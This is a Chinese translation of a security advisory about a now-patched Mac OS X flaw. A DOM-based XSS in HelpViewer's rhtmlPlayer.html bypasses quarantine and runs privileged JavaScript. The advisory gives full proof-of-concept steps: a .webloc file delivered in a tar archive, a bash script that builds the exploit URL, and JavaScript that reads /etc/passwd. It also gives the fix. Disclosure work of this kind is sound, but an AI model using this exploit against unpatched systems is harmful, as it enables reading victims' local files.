> 原文链接: https://www.anquanke.com//post/id/86950 


# 【漏洞预警】Mac OS X存在Javascript沙箱绕过漏洞，可造成任意文件读取！（含PoC）


                                阅读量   
                                **147800**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：wearesegment.com
                                <br>原文地址：[https://www.wearesegment.com/research/Mac-OS-X-Local-Javascript-Quarantine-Bypass.html](https://www.wearesegment.com/research/Mac-OS-X-Local-Javascript-Quarantine-Bypass.html)

译文仅供参考，具体内容表达以及含义原文为准

****

**[![](https://p1.ssl.qhimg.com/t013460976aa7655c7b.png)](https://p1.ssl.qhimg.com/t013460976aa7655c7b.png)**

****

译者：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：120RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**漏洞概要**

漏洞名称：Mac OS X本地Javascript隔离绕过漏洞（可读取本地文件）

影响产品：Mac OS X

影响版本：10.12, 10.11, 10.10及之前的版本也可能受到该漏洞的影响

影响厂商：apple.com

漏洞类型：DOM Based XSS

风险等级：3 / 5

漏洞发现者：Filippo Cavallarin – wearesegment.com

CVE编号：N/A

通知厂商日期：2017-07-15

厂商修复日期：2017-09-25

漏洞公开日期：2017-09-28

**<br>**

**漏洞细节**

**Mac OS X存在一个漏洞，利用这个漏洞，攻击者可以绕过Apple的隔离机制，不受任何限制执行任意Javascript代码。**

Apple隔离机制的原理是在下载的文件上设置一个扩展属性，以便系统在受限环境中打开或者执行这些文件（从下载的归档文件或者图像中提取的文件也适用于这种场景）。举个例子，被隔离的html文件无法加载本地资源。

该漏洞存在于某个html文件中，这个文件是Mac OS X内核的一部分，容易受到基于DOM的XSS攻击影响，最终导致在（未受限）上下文中执行任意Javascript命令。

<br>

**演示视频**





该文件的具体路径为：“/System/Library/CoreServices/HelpViewer.app/Contents/Resources/rhtmlPlayer.html”，文件包含如下代码：



```
&lt;script type="text/javascript" charset="utf-8"&gt;
setBasePathFromString(urlParam("rhtml"));
loadLocStrings();
loadJavascriptLibs();
function init () `{` /* &lt;-- called by &lt;body onload="init()" */
  [...]
  rHTMLPath = urlParam("rhtml"); /* &lt;-- takes 'rhtml' parameters from current url */
  [...]
  self.contentHttpReq.open('GET', rHTMLPath, true);
  self.contentHttpReq.onreadystatechange = function() `{`
      if (self.contentHttpReq.readyState == 4) `{`
          loadTutorial(self.contentHttpReq.responseText);
      `}`
  `}`
  [...]
`}`
function loadTutorial(response) `{`
  var rHTMLPath = urlParam("rhtml");
  // this will create a tutorialData item
  eval(response);
  [...]
`}`
function loadLocStrings()
`{`
  var headID = document.getElementsByTagName("head")[0];         
  var rHTMLPath = urlParam("rhtml");
  rHTMLPath = rHTMLPath.replace("metaData.html", "localizedStrings.js");
  var newScript = document.createElement('script');
  newScript.type = 'text/javascript';
  newScript.src = rHTMLPath;
  headID.appendChild(newScript);      
`}`
[...]
&lt;/script&gt;
```

简而言之，这段代码会从“rhtml”查询字符串参数中提取url地址，然后向该地址发起请求，将响应数据作为javascript代码加以执行。

这段代码中包含两段不同的基于DOM的XSS代码。

第一段代码位于loadLocStrings()函数内，该代码创建了一个SCRIPT元素，使用“rhtml”参数作为“src”的属性。

第二段代码位于init()函数内，使用“rhtml”参数发起ajax调用，然后将响应数据直接传递个eval()进行处理。

这样做的结果就是同样的载荷会被执行两次。

攻击者只要提供一个包含恶意数据的uri，就能控制响应数据，进而控制执行语句。

攻击者可以使用.webloc文件来利用这个漏洞。通常情况下，这类文件包含url地址，使用Safari打开这类文件时，它们会自动加载这个url地址。

攻击者可以构造一个.webloc文件，诱导受害者打开这个文件，然后就可以在受害者主机上执行高权限javascript命令。

由于.webloc文件同样会使用扩展属性来存储数据，因此攻击者需要将这类文件存放在tar归档文件中再发送给受害者（也可以存储在其他支持扩展属性的文件中）。



**PoC**

如果要重现这个漏洞，我们需要执行如下操作：

1、创建一个在目标上执行的javascript文件。

2、使用base64对文件内容进行编码。

3、将其编码为“uri组件（uri component）”（例如，我们可以使用encodeURIComponent这个js函数完成这一任务）。

4、利用这段数据构造如下形式的uri：

```
data:text/plain;base64,&lt;urlencoded base64&gt;
```

5、在开头添加如下字符串：

```
file:///System/Library/CoreServices/HelpViewer.app/Contents/Resources/rhtmlPlayer.html?rhtml=
```

6、使用Safari打开这个地址。

7、将其保存为书签。

8、将该书签拖放到Finder中（此时会创建一个.webloc文件，如果扩展名不是.webloc，需要重命名为正确的扩展名）。

9、创建一个tar归档文件，包含这个.webloc文件。

10、将归档文件发送给受害者。

需要注意的是，受限于rhtmlPlayer.html的处理流程，为了访问本地资源，我们所构造的javascript代码中第一行必须为：document.getElementsByTagName("base")[0].href=""。

我们可以使用如下bash脚本，将某个javascript文件转化为最终可利用的“file” url地址：



```
#!/bin/bash
BASEURL="file:///System/Library/CoreServices/HelpViewer.app/Contents/Resources/rhtmlPlayer.html?rhtml="
BASEJS="(function()`{`document.getElementsByTagName('base')[0].href='';if('_' in window)return;window._=1;"
DATAURI="data:text/plain;base64,"
JSFILE=$1
if [ "$JSFILE" = "" ]; then
  echo "usage: $0 "
  exit 1
fi
JS=$BASEJS`cat $JSFILE`"`}`)();"
ENCJS=`echo -n $JS | base64 | sed 's/=/%3D/g' | sed 's/+/%2F/g' | sed 's///%2B/g'`
URL="$BASEURL""$DATAURI""$ENCJS"
echo -ne "Paste the url below into Safari's url bar:n33[33m$URL33[0mn"
```

使用如下javascript代码，我们可以在受害者主机上显示“/etc/passwd”文件内容：



```
xhr = new XMLHttpRequest();
xhr.open("GET", "/etc/passwd", true);
xhr.onreadystatechange = function()`{`
 if (xhr.readyState == 4) `{`
  alert(xhr.responseText);
 `}`
`}`;
xhr.send();
```

需要注意的是，只有Safari才能通过ajax成功加载本地资源（Chrome以及Firefox不行）。对我们来说这并不是个问题，因为在这个漏洞利用过程中，只有Safari会打开.webloc文件。



**备注**

在本文成稿时，新版的Mac OS X High Sierra中悄悄修复了这个漏洞，因此Apple的更新日志中没有提到这个bug。

Apple没有为这个漏洞分配CVE编号。



**解决办法**

请更新至Mac OS X High Sierra，或者删除rhtmlPlayer.html以修复这个漏洞。



**漏洞状态**

Securiteam安全披露计划已公布了该漏洞，具体地址为：[http://www.beyondsecurity.com/ssd](http://www.beyondsecurity.com/ssd)  。
